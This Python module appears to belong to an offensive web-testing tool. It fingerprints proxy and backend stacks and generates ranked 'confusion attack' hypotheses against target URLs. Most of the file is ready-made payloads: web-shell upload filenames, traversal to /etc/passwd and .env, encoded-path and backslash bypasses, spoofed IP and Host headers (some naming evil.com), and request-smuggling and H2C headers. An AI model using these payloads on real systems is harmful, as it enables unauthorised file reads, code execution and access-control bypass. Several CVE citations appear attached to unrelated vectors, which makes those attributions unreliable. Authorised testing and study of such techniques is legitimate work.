"""Confusion Engine for Project Triage.

Implements Orange Tsai's 2024 confusion attack research - exploiting semantic
ambiguity between components that interpret the same data differently. When a
proxy and a backend disagree about what a URL or header means, the attacker
controls whose interpretation wins.

Research basis:
- Orange Tsai, "Confusion Attacks" (2024, Black Hat USA)
- Ambiguity between Nginx, Apache, IIS, Express, and CDN layers
"""

from __future__ import annotations

import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Any


# ---------------------------------------------------------------------------
# Data types
# ---------------------------------------------------------------------------

@dataclass
class Component:
    """A single component in the request-handling stack."""
    name: str         # e.g. "nginx", "apache", "express", "cloudflare"
    role: str         # "edge", "proxy", "waf", "backend", "runtime"
    version: str = ""
    confidence: float = 1.0
    traits: list[str] = field(default_factory=list)
    # Traits drive confusion matching:
    #   "normalizes_path", "follows_symlinks", "decodes_pct", "php_cgi",
    #   "windows_fs", "strips_path_info", etc.


@dataclass
class ConfusionVector:
    """A specific confusion opportunity between two components."""
    confusion_type: str     # filename, docroot, handler, encoding, header, protocol
    component_a: str        # component that interprets first (e.g. proxy)
    component_b: str        # component that interprets differently (e.g. backend)
    description: str
    precondition: str       # what must be true for this to apply
    impact: str
    severity: str           # critical / high / medium / low
    payloads: list[str] = field(default_factory=list)
    cve_refs: list[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Known component signatures
# ---------------------------------------------------------------------------

# Maps response header patterns to component identity
_HEADER_SIGNATURES: list[dict[str, Any]] = [
    # Edge / CDN
    {"pattern": r"(?i)cloudflare",  "header": "server",          "name": "cloudflare",  "role": "edge"},
    {"pattern": r"(?i)cloudflare",  "header": "via",             "name": "cloudflare",  "role": "edge"},
    {"pattern": r"(?i)AmazonS3",    "header": "server",          "name": "s3",          "role": "edge"},
    {"pattern": r"(?i)awselb",      "header": "server",          "name": "alb",         "role": "proxy"},
    {"pattern": r"(?i)cloudfront",  "header": "via",             "name": "cloudfront",  "role": "edge"},
    {"pattern": r"(?i)fastly",      "header": "via",             "name": "fastly",      "role": "edge"},
    {"pattern": r"(?i)akamai",      "header": "via",             "name": "akamai",      "role": "edge"},
    # Proxies
    {"pattern": r"(?i)nginx",       "header": "server",          "name": "nginx",       "role": "proxy"},
    {"pattern": r"(?i)haproxy",     "header": "server",          "name": "haproxy",     "role": "proxy"},
    {"pattern": r"(?i)traefik",     "header": "server",          "name": "traefik",     "role": "proxy"},
    {"pattern": r"(?i)envoy",       "header": "server",          "name": "envoy",       "role": "proxy"},
    {"pattern": r"(?i)squid",       "header": "server",          "name": "squid",       "role": "proxy"},
    # Backends / web servers
    {"pattern": r"(?i)apache",      "header": "server",          "name": "apache",      "role": "backend"},
    {"pattern": r"(?i)iis",         "header": "server",          "name": "iis",         "role": "backend"},
    {"pattern": r"(?i)litespeed",   "header": "server",          "name": "litespeed",   "role": "backend"},
    {"pattern": r"(?i)caddy",       "header": "server",          "name": "caddy",       "role": "backend"},
    # Runtimes
    {"pattern": r"(?i)express",     "header": "x-powered-by",   "name": "express",     "role": "runtime"},
    {"pattern": r"(?i)php",         "header": "x-powered-by",   "name": "php",         "role": "runtime"},
    {"pattern": r"(?i)next\.js",    "header": "x-powered-by",   "name": "nextjs",      "role": "runtime"},
    {"pattern": r"(?i)django",      "header": "server",          "name": "django",      "role": "runtime"},
    {"pattern": r"(?i)gunicorn",    "header": "server",          "name": "gunicorn",    "role": "runtime"},
    {"pattern": r"(?i)uvicorn",     "header": "server",          "name": "uvicorn",     "role": "runtime"},
    {"pattern": r"(?i)tomcat",      "header": "server",          "name": "tomcat",      "role": "runtime"},
    {"pattern": r"(?i)jetty",       "header": "server",          "name": "jetty",       "role": "runtime"},
]

# Traits assigned to specific components
_COMPONENT_TRAITS: dict[str, list[str]] = {
    "nginx": [
        "normalizes_path", "decodes_pct_once", "alias_directive",
        "proxy_pass", "try_files", "merge_slashes",
    ],
    "apache": [
        "mod_rewrite", "path_info", "htaccess", "addhandler",
        "sethandler", "multiviews", "follows_symlinks", "mod_proxy",
        "decodes_pct_once",
    ],
    "iis": [
        "windows_fs", "backslash_equiv", "asp_net", "isapi",
        "semicolon_path_info", "double_escape",
    ],
    "cloudflare": [
        "normalizes_path", "strips_double_slash", "waf", "cache_layer",
        "trusts_forwarded_for",
    ],
    "cloudfront": [
        "strips_double_slash", "cache_layer", "origin_routing",
        "forwards_host",
    ],
    "alb": [
        "normalizes_path", "strips_query_before_routing",
    ],
    "traefik": [
        "normalizes_path", "middleware_chain",
    ],
    "haproxy": [
        "normalizes_path", "acl_routing",
    ],
    "express": [
        "decodes_pct_once", "case_sensitive_routes",
    ],
    "nextjs": [
        "rewrites", "decodes_pct_once", "case_sensitive_routes",
    ],
    "php": [
        "path_info", "php_cgi", "extension_handling",
    ],
    "tomcat": [
        "path_info", "semicolon_path_info", "java_decode",
    ],
    "gunicorn": [],
    "uvicorn": [],
    "django": ["decodes_pct_once"],
    "fastly": ["normalizes_path", "vcl", "cache_layer"],
}

# ---------------------------------------------------------------------------
# Known proxy+backend confusion mappings
# ---------------------------------------------------------------------------

# Each entry: (proxy_name, backend_name) -> list of ConfusionVector stubs
_STACK_CONFUSION_MAP: dict[tuple[str, str], list[dict[str, Any]]] = {

    ("nginx", "apache"): [
        {
            "confusion_type": "handler",
            "description": "Nginx proxies by extension; Apache's AddHandler picks up .php in arbitrary filenames",
            "precondition": "Apache has AddHandler application/x-httpd-php .php and Nginx proxy_pass configured",
            "impact": "PHP execution on files Apache treats as PHP but Nginx served as static",
            "severity": "critical",
            "payloads": [
                "/uploads/shell.php.jpg",
                "/uploads/shell.php%00.jpg",
                "/uploads/.php",
                "/uploads/shell.PhP.jpg",
            ],
            "cve_refs": ["CVE-2019-11043"],
        },
        {
            "confusion_type": "docroot",
            "description": "Nginx alias misconfiguration allows path traversal into Apache's DocumentRoot",
            "precondition": "Nginx location /static { alias /var/www/static; } without trailing slash",
            "impact": "Read files outside the intended static directory via traversal",
            "severity": "high",
            "payloads": [
                "/static../etc/passwd",
                "/static../app/config.php",
                "/static../.env",
            ],
            "cve_refs": [],
        },
        {
            "confusion_type": "filename",
            "description": "Apache path_info allows /file.php/arbitrary to execute file.php with PATH_INFO=/arbitrary",
            "precondition": "Apache AcceptPathInfo On (default)",
            "impact": "WAF bypass by appending path info that WAF blocks but Apache ignores for execution",
            "severity": "high",
            "payloads": [
                "/app/upload.php/../../admin",
                "/index.php/.well-known/security.txt",
                "/api.php/v2/users",
            ],
            "cve_refs": [],
        },
    ],

    ("nginx", "express"): [
        {
            "confusion_type": "encoding",
            "description": "Nginx normalizes %2F to / before routing but Express sees the encoded form",
            "precondition": "Nginx proxy_pass with default path normalisation",
            "impact": "Access routes that Express's router would normally reject or route differently",
            "severity": "high",
            "payloads": [
                "/api/v1/users%2F../admin",
                "/api%2Fv1%2Fusers",
                "/%2e%2e/api/internal",
            ],
            "cve_refs": [],
        },
        {
            "confusion_type": "docroot",
            "description": "Nginx try_files directive serves static files before proxying to Express, causing confusion on overlapping paths",
            "precondition": "Nginx try_files $uri $uri/ @backend",
            "impact": "Static file served instead of Express dynamic handler, or vice versa",
            "severity": "medium",
            "payloads": [
                "/index.html/",
                "/.well-known/",
                "/static/../../secret",
            ],
            "cve_refs": [],
        },
    ],

    ("cloudflare", "nginx"): [
        {
            "confusion_type": "header",
            "description": "Cloudflare trusts and forwards X-Forwarded-For; Nginx uses the last value; attacker controls first",
            "precondition": "Nginx uses $http_x_forwarded_for for IP-based access control",
            "impact": "IP allowlist bypass, rate-limit bypass, geo-restriction bypass",
            "severity": "high",
            "payloads": [
                "X-Forwarded-For: 127.0.0.1",
                "X-Forwarded-For: 10.0.0.1, 203.0.113.1",
                "CF-Connecting-IP: 127.0.0.1",
                "True-Client-IP: 127.0.0.1",
            ],
            "cve_refs": [],
        },
        {
            "confusion_type": "protocol",
            "description": "Cloudflare terminates TLS and re-connects to Nginx over HTTP/1.1; H2C upgrade headers may pass through",
            "precondition": "Nginx configured for cleartext backend with http2 module",
            "impact": "H2C smuggling via Upgrade header that Cloudflare does not strip",
            "severity": "high",
            "payloads": [
                "Upgrade: h2c\r\nHTTP2-Settings: AAMAAABkAAQAAP__",
                "Connection: Upgrade, HTTP2-Settings",
            ],
            "cve_refs": [],
        },
    ],

    ("cloudfront", "nginx"): [
        {
            "confusion_type": "docroot",
            "description": "CloudFront origin path stripping differs from Nginx prefix handling",
            "precondition": "CloudFront origin path configured as /api, Nginx location /api",
            "impact": "Double prefix or missing prefix leads to different resource resolution",
            "severity": "medium",
            "payloads": [
                "/api/api/users",
                "//api/users",
                "/api/%2Finternal",
            ],
            "cve_refs": [],
        },
    ],

    ("alb", "express"): [
        {
            "confusion_type": "encoding",
            "description": "AWS ALB decodes %20 to space in routing rules but Express receives decoded path",
            "precondition": "ALB routing rules use path-pattern conditions",
            "impact": "Route rule bypass via encoded characters that ALB normalises before Express sees",
            "severity": "medium",
            "payloads": [
                "/admin%20panel",
                "/internal%00",
                "/api/%2e%2e/secret",
            ],
            "cve_refs": [],
        },
    ],

    ("nginx", "php"): [
        {
            "confusion_type": "filename",
            "description": "Nginx passes arbitrary PATH_INFO to PHP-FPM when SCRIPT_FILENAME is set from URI",
            "precondition": "Nginx fastcgi_param SCRIPT_FILENAME set using $document_root$fastcgi_script_name",
            "impact": "Execute PHP files that should be served as static via path traversal in fastcgi",
            "severity": "critical",
            "payloads": [
                "/uploads/evil.jpg/index.php",
                "/static/data.json/../../index.php",
                "/user.php%0aContent-Type:text/html",
            ],
            "cve_refs": ["CVE-2019-11043"],
        },
    ],

    ("nginx", "tomcat"): [
        {
            "confusion_type": "filename",
            "description": "Tomcat interprets semicolons as path parameter separators; Nginx does not strip them",
            "precondition": "Nginx proxy_pass to Tomcat without stripping semicolons",
            "impact": "Bypass path-based security constraints configured in web.xml",
            "severity": "high",
            "payloads": [
                "/admin;/index.jsp",
                "/WEB-INF;x/web.xml",
                "/servlet;jsessionid=AAAA/../admin",
            ],
            "cve_refs": ["CVE-2020-1938"],
        },
    ],
}


# ---------------------------------------------------------------------------
# Payload libraries
# ---------------------------------------------------------------------------

_FILENAME_PAYLOADS: list[str] = [
    # Null byte truncation
    "shell.php%00.jpg",
    "shell.php%00.png",
    "shell.php%0a.jpg",
    # Double extension
    "shell.php.jpg",
    "shell.php.png",
    "shell.php.gif",
    # Extension in middle
    "shell.php5.jpg",
    "shell.pHp.jpg",
    "shell.PHP.jpg",
    # URL-encoded extension dot
    "shell%2ephp",
    "shell.ph%70",
    "shell%2Ephp%2Ejpg",
    # Path info injection
    "image.jpg/shell.php",
    "data.json/../../cmd.php",
    # IIS semicolon
    "shell.asp;.jpg",
    "admin.aspx;.css",
    # Trailing dots (Windows)
    "shell.php.",
    "shell.php...",
    # Trailing slash forces directory handler
    "shell.php/",
]

_DOCROOT_PAYLOADS: list[str] = [
    # Nginx alias off-by-one
    "/static../etc/passwd",
    "/static../.env",
    "/static../app/config/database.yml",
    # Path normalisation bypass
    "/app/./secret",
    "/app//../secret",
    "/app/%2e%2e/secret",
    "/app/%2f%2e%2e%2fsecret",
    # Double slash
    "//etc/passwd",
    "//admin//users",
    # Windows UNC
    "/app/..\\..\\windows\\win.ini",
    "/static\\..\\..\\secret",
]

_HANDLER_PAYLOADS: list[str] = [
    # Content-Type vs extension disagreement
    "/upload/file.txt",        # POST with Content-Type: application/x-php
    "/api/render.php",         # GET expecting JSON but PHP processes it
    "/api/data.json.php",
    "/api/config.php.bak",
    # CGI handler mismatch
    "/cgi-bin/test.py",
    "/cgi-bin/shell.pl",
    "/scripts/upload.asp",
]

_ENCODING_PAYLOADS: list[str] = [
    # Double URL encoding
    "%252e%252e%252f",          # decoded once: %2e%2e%2f, twice: ../
    "%25%32%65%25%32%65%25%32%66",
    # Unicode overlong encoding (UTF-8)
    "%c0%ae%c0%ae%c0%af",       # ../  in overlong UTF-8
    "%c0%2f",
    # Unicode normalisation
    "\u002e\u002e\u002f",        # U+002E U+002E U+002F = ../
    "\uff0e\uff0e\u2215",        # fullwidth ../
    # Backslash (Windows backends)
    "..\\",
    "%5c%5c",                    # \\
    "/%5c../secret",
    # Mixed slash
    "/api\\/v1/users",
    "/api/%5Cv1/users",
    # Null byte
    "%00",
    "%2500",
    # Tab / newline in path
    "path%09query",
    "path%0dinjected",
]

_HEADER_PAYLOADS: list[str] = [
    # Host header confusion
    "Host: internal-service",
    "Host: localhost",
    "Host: 127.0.0.1",
    "Host: target.com:443@evil.com",
    # IP spoofing headers
    "X-Forwarded-For: 127.0.0.1",
    "X-Real-IP: 127.0.0.1",
    "X-Originating-IP: 127.0.0.1",
    "X-Remote-IP: 127.0.0.1",
    "Forwarded: for=127.0.0.1",
    "CF-Connecting-IP: 127.0.0.1",
    # Content-Length vs Transfer-Encoding
    "Transfer-Encoding: chunked",
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
    # Cache poisoning via duplicate headers
    "X-Forwarded-Host: evil.com",
    "X-Forwarded-Proto: https",
    # Header case sensitivity
    "content-type: application/json",   # lowercase to confuse case-sensitive parsers
    "CONTENT-TYPE: application/json",   # uppercase
]

_PROTOCOL_PAYLOADS: list[str] = [
    # H2C smuggling
    "Upgrade: h2c",
    "Connection: Upgrade, HTTP2-Settings",
    "HTTP2-Settings: AAMAAABkAAQAAP__",
    # WebSocket upgrade confusion
    "Upgrade: websocket",
    "Connection: Upgrade",
    "Sec-WebSocket-Version: 13",
    # HTTP/2 pseudo-header injection (conceptual - shown as raw)
    ":authority: internal-admin",
    ":path: /admin",
    ":method: CONNECT",
]


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------

class ConfusionEngine:
    """Identify component stacks and generate confusion attack hypotheses."""

    def __init__(self) -> None:
        self._stack_map = _STACK_CONFUSION_MAP
        self._component_traits = _COMPONENT_TRAITS
        self._header_sigs = _HEADER_SIGNATURES

    # ------------------------------------------------------------------
    # Component identification
    # ------------------------------------------------------------------

    def identify_component_stack(
        self,
        headers: dict[str, str],
        url: str,
        tech_stack: dict[str, Any],
    ) -> list[Component]:
        """Infer the component stack from response headers and known tech signals.

        Returns components ordered from outermost (edge) to innermost (runtime).
        """
        found: dict[str, Component] = {}

        lower_headers = {k.lower(): v for k, v in headers.items()}

        # Signature-based matching
        for sig in self._header_sigs:
            header_val = lower_headers.get(sig["header"].lower(), "")
            if re.search(sig["pattern"], header_val):
                name = sig["name"]
                if name not in found:
                    found[name] = Component(
                        name=name,
                        role=sig["role"],
                        traits=list(self._component_traits.get(name, [])),
                        confidence=0.9,
                    )

        # Tech stack hints (from fingerprinting or user-supplied context)
        for key, value in tech_stack.items():
            val_str = str(value).lower()
            for comp_name, traits in self._component_traits.items():
                if comp_name in val_str or comp_name in str(key).lower():
                    if comp_name not in found:
                        # Determine role from traits and name
                        role = self._infer_role(comp_name)
                        found[comp_name] = Component(
                            name=comp_name,
                            role=role,
                            traits=list(traits),
                            confidence=0.6,
                        )

        # URL signals
        url_lower = url.lower()
        if ".php" in url_lower and "php" not in found:
            found["php"] = Component(
                name="php", role="runtime",
                traits=list(self._component_traits.get("php", [])),
                confidence=0.7,
            )
        if ".jsp" in url_lower and "tomcat" not in found:
            found["tomcat"] = Component(
                name="tomcat", role="runtime",
                traits=list(self._component_traits.get("tomcat", [])),
                confidence=0.6,
            )
        if ".aspx" in url_lower or ".asp" in url_lower:
            if "iis" not in found:
                found["iis"] = Component(
                    name="iis", role="backend",
                    traits=list(self._component_traits.get("iis", [])),
                    confidence=0.7,
                )

        # Sort: edge -> proxy -> backend -> runtime
        role_order = {"edge": 0, "proxy": 1, "waf": 1, "backend": 2, "runtime": 3}
        components = sorted(found.values(), key=lambda c: role_order.get(c.role, 2))
        return components

    @staticmethod
    def _infer_role(name: str) -> str:
        edge_names = {"cloudflare", "cloudfront", "akamai", "fastly", "s3"}
        proxy_names = {"nginx", "haproxy", "traefik", "envoy", "squid", "alb"}
        runtime_names = {"php", "express", "nextjs", "django", "gunicorn", "uvicorn", "tomcat", "jetty"}
        if name in edge_names:
            return "edge"
        if name in proxy_names:
            return "proxy"
        if name in runtime_names:
            return "runtime"
        return "backend"

    # ------------------------------------------------------------------
    # Confusion vector detection
    # ------------------------------------------------------------------

    def detect_confusion_opportunities(
        self,
        components: list[Component],
        url: str,
    ) -> list[ConfusionVector]:
        """Return confusion vectors applicable to the detected component stack."""
        vectors: list[ConfusionVector] = []

        comp_names = [c.name for c in components]

        # Check each pair in stack order
        for i in range(len(components)):
            for j in range(i + 1, len(components)):
                pair = (components[i].name, components[j].name)
                pair_rev = (components[j].name, components[i].name)

                for stack_pair, vector_stubs in self._stack_map.items():
                    if stack_pair == pair or stack_pair == pair_rev:
                        a_name = stack_pair[0]
                        b_name = stack_pair[1]
                        for stub in vector_stubs:
                            vectors.append(ConfusionVector(
                                confusion_type=stub["confusion_type"],
                                component_a=a_name,
                                component_b=b_name,
                                description=stub["description"],
                                precondition=stub["precondition"],
                                impact=stub["impact"],
                                severity=stub["severity"],
                                payloads=list(stub["payloads"]),
                                cve_refs=list(stub.get("cve_refs", [])),
                            ))

        # Generic cross-component trait-based vectors
        all_traits = set()
        for c in components:
            for t in c.traits:
                all_traits.add(t)

        # Encoding confusion: if any component normalises and another does not
        normalising = [c for c in components if "normalizes_path" in c.traits]
        non_normalising = [c for c in components if "normalizes_path" not in c.traits and c.role in ("backend", "runtime")]
        if normalising and non_normalising:
            vectors.append(ConfusionVector(
                confusion_type="encoding",
                component_a=normalising[0].name,
                component_b=non_normalising[0].name,
                description=(
                    f"{normalising[0].name} normalises path before forwarding; "
                    f"{non_normalising[0].name} may interpret differently"
                ),
                precondition="Path-based routing or access control exists",
                impact="Bypass routing rules, access control, or WAF via encoded path variants",
                severity="high",
                payloads=_ENCODING_PAYLOADS[:8],
            ))

        # Windows backend confusion
        windows_comps = [c for c in components if "windows_fs" in c.traits]
        if windows_comps:
            vectors.append(ConfusionVector(
                confusion_type="encoding",
                component_a="linux_proxy",
                component_b=windows_comps[0].name,
                description="Linux proxy does not translate backslashes; Windows IIS treats them as path separators",
                precondition="IIS backend behind Linux proxy",
                impact="Path traversal via backslash that proxy does not normalise",
                severity="high",
                payloads=[p for p in _ENCODING_PAYLOADS if "\\" in p or "%5c" in p.lower()],
            ))

        # PHP path_info confusion
        php_comps = [c for c in components if "path_info" in c.traits]
        proxy_comps = [c for c in components if c.role in ("proxy", "edge")]
        if php_comps and proxy_comps:
            vectors.append(ConfusionVector(
                confusion_type="filename",
                component_a=proxy_comps[0].name,
                component_b=php_comps[0].name,
                description="PHP PATH_INFO allows non-.php suffixes to execute PHP when proxy does not validate extension",
                precondition="PHP with AcceptPathInfo or cgi.fix_pathinfo enabled",
                impact="Execute arbitrary PHP via disguised file path",
                severity="critical",
                payloads=["/uploads/evil.jpg/index.php", "/data/image.png/../cmd.php"],
            ))

        return vectors

    # ------------------------------------------------------------------
    # Payload generation
    # ------------------------------------------------------------------

    def generate_confusion_payloads(
        self,
        vector: ConfusionVector,
    ) -> list[str]:
        """Return a full payload list for a given confusion vector.

        Merges vector-specific payloads with generic payloads for the confusion type.
        """
        base_payloads: list[str] = list(vector.payloads)

        type_map: dict[str, list[str]] = {
            "filename": _FILENAME_PAYLOADS,
            "docroot": _DOCROOT_PAYLOADS,
            "handler": _HANDLER_PAYLOADS,
            "encoding": _ENCODING_PAYLOADS,
            "header": _HEADER_PAYLOADS,
            "protocol": _PROTOCOL_PAYLOADS,
        }

        generic = type_map.get(vector.confusion_type, [])

        # Deduplicate while preserving order
        seen: set[str] = set(base_payloads)
        for p in generic:
            if p not in seen:
                base_payloads.append(p)
                seen.add(p)

        return base_payloads

    # ------------------------------------------------------------------
    # Hypothesis generation
    # ------------------------------------------------------------------

    def generate_confusion_hypotheses(
        self,
        url: str,
        tech_stack: dict[str, Any],
        endpoints: list[dict[str, Any]],
    ) -> list[dict[str, Any]]:
        """Top-level method: identify stack, find vectors, produce hypotheses.

        Each hypothesis dict contains:
            endpoint, technique, description, novelty, exploitability, impact, effort
        """
        hypotheses: list[dict[str, Any]] = []

        # Parse base URL
        parsed = urllib.parse.urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Build a synthetic headers dict from tech_stack if real headers not provided
        fake_headers: dict[str, str] = {}
        for k, v in tech_stack.items():
            if isinstance(v, str) and k.lower() in ("server", "x-powered-by", "via"):
                fake_headers[k] = v

        components = self.identify_component_stack(fake_headers, url, tech_stack)
        vectors = self.detect_confusion_opportunities(components, url)

        # Severity to numeric impact
        sev_map = {"critical": 0.95, "high": 0.75, "medium": 0.5, "low": 0.2}
        effort_map = {
            "filename": "low",
            "encoding": "low",
            "handler": "medium",
            "docroot": "medium",
            "header": "low",
            "protocol": "high",
        }
        novelty_map = {
            "filename": 0.75,
            "encoding": 0.80,
            "handler": 0.70,
            "docroot": 0.70,
            "header": 0.65,
            "protocol": 0.85,
        }

        # Generate a hypothesis per vector
        for v in vectors:
            payloads = self.generate_confusion_payloads(v)
            payload_preview = payloads[0] if payloads else ""
            cve_note = f" ({', '.join(v.cve_refs)})" if v.cve_refs else ""

            hypotheses.append({
                "endpoint": url,
                "technique": f"confusion:{v.confusion_type}:{v.component_a}+{v.component_b}",
                "description": (
                    f"[{v.confusion_type.upper()} CONFUSION] {v.component_a} vs {v.component_b}{cve_note}. "
                    f"{v.description}. "
                    f"Precondition: {v.precondition}. "
                    f"Sample payload: {payload_preview}"
                ),
                "novelty": novelty_map.get(v.confusion_type, 0.7),
                "exploitability": sev_map.get(v.severity, 0.5),
                "impact": sev_map.get(v.severity, 0.5),
                "effort": effort_map.get(v.confusion_type, "medium"),
                "_payloads": payloads[:10],
                "_vector": {
                    "type": v.confusion_type,
                    "component_a": v.component_a,
                    "component_b": v.component_b,
                    "precondition": v.precondition,
                    "cve_refs": v.cve_refs,
                },
            })

        # Per-endpoint hypotheses for file upload or dynamic endpoints
        for ep in endpoints:
            ep_path = ep.get("path", ep.get("url", ""))
            ep_method = ep.get("method", "GET").upper()
            if not ep_path:
                continue

            ep_url = ep_path if ep_path.startswith("http") else f"{base}{ep_path}"

            # File upload endpoints - filename confusion is highest priority
            if any(kw in ep_path.lower() for kw in ("upload", "file", "image", "avatar", "attach")):
                hypotheses.append({
                    "endpoint": ep_url,
                    "technique": "confusion:filename:upload_extension",
                    "description": (
                        f"[FILENAME CONFUSION] Upload endpoint {ep_path} may allow extension confusion. "
                        "Double-extension (shell.php.jpg), null-byte (shell.php%00.jpg), and "
                        "URL-encoded dot (shell%2ephp) may execute as PHP/ASP depending on backend handler."
                    ),
                    "novelty": 0.80,
                    "exploitability": 0.85,
                    "impact": 0.95,
                    "effort": "low",
                    "_payloads": _FILENAME_PAYLOADS[:8],
                })

            # API paths - encoding confusion
            if "/api/" in ep_path or ep_path.startswith("/api"):
                hypotheses.append({
                    "endpoint": ep_url,
                    "technique": "confusion:encoding:api_path",
                    "description": (
                        f"[ENCODING CONFUSION] API endpoint {ep_path} may interpret encoded slashes "
                        "differently at proxy vs backend. Try %2F, %252F, and %c0%af to bypass "
                        "path-based routing rules."
                    ),
                    "novelty": 0.75,
                    "exploitability": 0.70,
                    "impact": 0.70,
                    "effort": "low",
                    "_payloads": [
                        ep_path.replace("/", "%2F"),
                        ep_path.replace("/", "%252F"),
                        ep_path + "/%2e%2e/secret",
                        ep_path + "/../admin",
                    ],
                })

            # Admin or internal paths - docroot confusion
            if any(kw in ep_path.lower() for kw in ("admin", "internal", "manage", "console", "debug")):
                hypotheses.append({
                    "endpoint": ep_url,
                    "technique": "confusion:docroot:admin_path",
                    "description": (
                        f"[DOCROOT CONFUSION] {ep_path} may be reachable via Nginx alias traversal. "
                        "If Nginx location directive lacks trailing slash, /static.. prefix may "
                        "traverse out of the restricted directory."
                    ),
                    "novelty": 0.72,
                    "exploitability": 0.65,
                    "impact": 0.80,
                    "effort": "medium",
                    "_payloads": _DOCROOT_PAYLOADS[:6],
                })

            # Handler confusion for mixed content-type paths
            if ep_method == "POST" and any(
                ep_path.lower().endswith(ext)
                for ext in (".json", ".xml", ".txt", ".html", ".htm")
            ):
                hypotheses.append({
                    "endpoint": ep_url,
                    "technique": "confusion:handler:content_type_mismatch",
                    "description": (
                        f"[HANDLER CONFUSION] POST to {ep_path} - Content-Type header vs URL extension "
                        "may disagree on which handler processes the body. Try sending "
                        "application/x-www-form-urlencoded to a JSON endpoint or multipart to a "
                        "JSON parser to trigger type confusion."
                    ),
                    "novelty": 0.68,
                    "exploitability": 0.60,
                    "impact": 0.65,
                    "effort": "medium",
                    "_payloads": _HANDLER_PAYLOADS,
                })

        # Add generic protocol confusion if HTTP/2 is plausible
        stack_str = " ".join(str(v) for v in tech_stack.values()).lower()
        if any(t in stack_str for t in ("nginx", "h2", "http2", "cloudflare", "cloudfront")):
            hypotheses.append({
                "endpoint": url,
                "technique": "confusion:protocol:h2c_smuggling",
                "description": (
                    "[PROTOCOL CONFUSION] H2C smuggling via Upgrade: h2c header. "
                    "If the edge/proxy upgrades to HTTP/2 cleartext but the backend does not, "
                    "the Upgrade header may pass through unfiltered, enabling request smuggling "
                    "or routing bypass."
                ),
                "novelty": 0.90,
                "exploitability": 0.70,
                "impact": 0.85,
                "effort": "high",
                "_payloads": _PROTOCOL_PAYLOADS,
            })

        # Sort by impact * exploitability descending
        hypotheses.sort(
            key=lambda h: h["impact"] * h["exploitability"],
            reverse=True,
        )

        return hypotheses

    # ------------------------------------------------------------------
    # Utility
    # ------------------------------------------------------------------

    def summarise_stack(self, components: list[Component]) -> str:
        """Return a human-readable summary of the identified component stack."""
        if not components:
            return "No components identified"
        parts = " -> ".join(
            f"{c.name}({c.role}, conf={c.confidence:.0%})" for c in components
        )
        return f"Stack: {parts}"

    def payloads_for_type(self, confusion_type: str) -> list[str]:
        """Return the full generic payload list for a confusion type.

        Useful for quick payload lookup without going through a full vector.
        """
        mapping = {
            "filename": _FILENAME_PAYLOADS,
            "docroot": _DOCROOT_PAYLOADS,
            "handler": _HANDLER_PAYLOADS,
            "encoding": _ENCODING_PAYLOADS,
            "header": _HEADER_PAYLOADS,
            "protocol": _PROTOCOL_PAYLOADS,
        }
        return list(mapping.get(confusion_type, []))
